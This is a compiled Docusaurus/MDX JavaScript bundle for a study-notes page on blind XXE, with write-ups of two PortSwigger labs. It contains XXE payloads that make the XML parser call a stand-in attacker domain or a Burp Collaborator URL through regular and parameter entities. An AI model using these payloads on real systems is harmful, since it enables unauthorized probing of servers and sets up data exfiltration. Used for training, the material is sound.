"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[796],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return h}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),u=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=u(e.components);return a.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),d=u(n),h=r,g=d["".concat(s,".").concat(h)]||d[h]||c[h]||i;return n?a.createElement(g,o(o({ref:t},p),{},{components:n})):a.createElement(g,o({ref:t},p))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,o=new Array(i);o[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,o[1]=l;for(var u=2;u<i;u++)o[u]=n[u];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},89766:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return u},toc:function(){return p},default:function(){return d}});var a=n(87462),r=n(63366),i=(n(67294),n(3905)),o=["components"],l={tags:["blind","XXE"],image:"https://cdn.acunetix.com/wp-content/uploads/2017/07/11110651/XXE_600x315.png"},s=void 0,u={unversionedId:"portswigger/XXE/Blind XXE",id:"portswigger/XXE/Blind XXE",title:"Blind XXE",description:"What is blind XXE?",source:"@site/docs/portswigger/XXE/Blind XXE.md",sourceDirName:"portswigger/XXE",slug:"/portswigger/XXE/Blind XXE",permalink:"/Cybernotes/docs/portswigger/XXE/Blind XXE",tags:[{label:"blind",permalink:"/Cybernotes/docs/tags/blind"},{label:"XXE",permalink:"/Cybernotes/docs/tags/xxe"}],version:"current",frontMatter:{tags:["blind","XXE"],image:"https://cdn.acunetix.com/wp-content/uploads/2017/07/11110651/XXE_600x315.png"},sidebar:"tutorialSidebar",previous:{title:"Exploiting XXE to perform SSRF attacks",permalink:"/Cybernotes/docs/portswigger/XXE/Exploiting XXE to perform SSRF attacks"},next:{title:"Blind-XXE-with-error-messages",permalink:"/Cybernotes/docs/portswigger/XXE/Blind-XXE-with-error-messages"}},p=[{value:"What is blind XXE?",id:"what-is-blind-xxe",children:[],level:2},{value:"Detecting blind XXE using out-of-band (OAST) techniques",id:"detecting-blind-xxe-using-out-of-band-oast-techniques",children:[],level:2},{value:"Challenge",id:"challenge",children:[],level:2},{value:"XML parameter entity",id:"xml-parameter-entity",children:[],level:2},{value:"Challenge",id:"challenge-1",children:[],level:2}],c={toc:p};function d(e){var t=e.components,l=(0,r.Z)(e,o);return(0,i.kt)("wrapper",(0,a.Z)({},c,l,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"what-is-blind-xxe"},"What is blind XXE?"),(0,i.kt)("p",null,"Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities."),(0,i.kt)("p",null,"There are two broad ways in which you can find and exploit blind XXE vulnerabilities:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data."),(0,i.kt)("li",{parentName:"ul"},"You can trigger XML parsing errors in such a way that the error messages contain sensitive data.")),(0,i.kt)("h2",{id:"detecting-blind-xxe-using-out-of-band-oast-techniques"},"Detecting blind XXE using out-of-band (",(0,i.kt)("a",{parentName:"h2",href:"https://portswigger.net/burp/application-security-testing/oast"},"OAST"),") techniques"),(0,i.kt)("p",null,"You can often detect blind XXE using the same technique as for ",(0,i.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks"},"XXE SSRF attacks")," but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>')),(0,i.kt)("p",null,"You would then make use of the defined entity in a data value within the XML."),(0,i.kt)("p",null,"This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful."),(0,i.kt)("h2",{id:"challenge"},"Challenge"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},'This lab has a "Check stock" feature that parses XML input but does not display the result.\nYou can detect the ',(0,i.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/xxe/blind"},"blind XXE")," vulnerability by triggering out-of-band interactions with an external domain.\nTo solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.")),(0,i.kt)("p",null,"--\x3e For this lab we will use burp collaborator which you can use by going ",(0,i.kt)("inlineCode",{parentName:"p"},"burp -> burp collaborator client")),(0,i.kt)("p",null,"After that i intercepted check stock request and added this payload:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<burp-collaborator-url>"> ]>\n')),(0,i.kt)("p",null,"--\x3e And change the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"productId")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"stockId")," to ",(0,i.kt)("inlineCode",{parentName:"p"},"&xxe;")),(0,i.kt)("p",null,"Final payload will look like this:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(68959).Z,width:"1315",height:"707"})),(0,i.kt)("p",null,"--\x3e And then goto collaborator client and click ",(0,i.kt)("inlineCode",{parentName:"p"},"poll now")," you will see a DNS lookup on your domain."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(54131).Z,width:"1395",height:"765"})),(0,i.kt)("p",null,"And we solved the lab!"),(0,i.kt)("h2",{id:"xml-parameter-entity"},"XML parameter entity"),(0,i.kt)("p",null,"Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},'<!ENTITY % myparameterentity "my parameter entity value" >')),(0,i.kt)("p",null,"And second, parameter entities are referenced using the percent character instead of the usual ampersand:"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"%myparameterentity;")),(0,i.kt)("p",null,"This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>')),(0,i.kt)("p",null,"This XXE payload declares an XML parameter entity called ",(0,i.kt)("inlineCode",{parentName:"p"},"xxe")," and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful"),(0,i.kt)("h2",{id:"challenge-1"},"Challenge"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},'This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.\nTo solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.')),(0,i.kt)("p",null,"--\x3e This lab is similar to previous one but here we have to declare one XML parameter entity and then call it within the DTD So i made this payload and intercepted ",(0,i.kt)("inlineCode",{parentName:"p"},"check stock")," request:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "<BURP-URL>"> %xxe; ]>\n')),(0,i.kt)("p",null,"Final request will look like this:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(15512).Z,width:"1409",height:"743"})),(0,i.kt)("p",null,"And after clicking ",(0,i.kt)("inlineCode",{parentName:"p"},"poll now")," i got one DNS lookup and we solved the lab!"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(1459).Z,width:"1383",height:"913"})))}d.isMDXComponent=!0},54131:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220302120527-11f754526996c4be286ada1e26fa11d5.png"},68959:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220302121618-32e7f4658b73b1b41080887b390e8281.png"},15512:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220302123749-a1ff728b4789a2face4926b91dc8c09e.png"},1459:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220302123826-727624e76f4a00ba6126607f087d61e4.png"}}]);